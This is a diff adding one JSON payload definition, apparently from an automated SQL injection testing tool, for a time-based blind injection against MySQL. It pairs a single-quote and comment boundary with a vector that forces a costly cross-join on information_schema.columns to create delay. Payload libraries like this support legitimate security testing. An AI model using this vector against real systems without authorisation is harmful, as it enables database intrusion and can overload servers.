@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "time",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "-- -",
+  "type": "single-quote",
+  "desc": "single-quoted + inline comment"
+ },
+ "vector": "{B} AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C)",
+ "comment": "mysql time via single-quoted + inline comment"
+}
